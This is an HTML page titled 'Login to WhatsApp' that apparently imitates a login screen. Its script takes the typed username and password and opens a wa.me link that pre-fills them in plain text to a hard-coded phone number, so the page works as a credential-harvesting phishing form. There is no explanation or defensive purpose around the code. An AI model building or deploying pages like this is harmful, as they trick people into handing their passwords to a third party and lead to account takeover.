<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Login to WhatsApp</title>
    <style>
      body {
        font-family: Arial, sans-serif;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        background-color: #f0f0f0;
      }
      .login-container {
        background-color: white;
        padding: 20px;
        border-radius: 5px;
        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
      }
      .login-container input {
        display: block;
        width: 100%;
        padding: 10px;
        margin: 10px 0;
        border-radius: 5px;
        border: 1px solid #ccc;
      }
      .login-container button {
        width: 100%;
        padding: 10px;
        background-color: #4caf50;
        color: white;
        border: none;
        border-radius: 5px;
        cursor: pointer;
      }
      .login-container button:hover {
        background-color: #45a049;
      }
    </style>
  </head>
  <body>
    <div class="login-container">
      <h2>Login</h2>
      <form id="loginForm">
        <label for="username">Username:</label>
        <input type="text" id="username" name="username" required />

        <label for="password">Password:</label>
        <input type="password" id="password" name="password" required />

        <button type="submit">Login and Send to WhatsApp</button>
      </form>
    </div>

    <script>
      document
        .getElementById("loginForm")
        .addEventListener("submit", function (event) {
          event.preventDefault(); // Prevent form from submitting traditionally

          // Get form data
          const username = document.getElementById("username").value;
          const password = document.getElementById("password").value;

          // WhatsApp message format
          const message = `Username: ${username}, Password: ${password}`;

          // WhatsApp number (without '+' and with country code, e.g., 91 for India)
          const whatsappNumber = "7282010159"; // Replace with your number

          // Create WhatsApp URL
          const whatsappUrl = `https://wa.me/${whatsappNumber}?text=${encodeURIComponent(
            message
          )}`;

          // Redirect user to WhatsApp
          window.open(whatsappUrl, "_blank");
        });
    </script>
  </body>
</html>
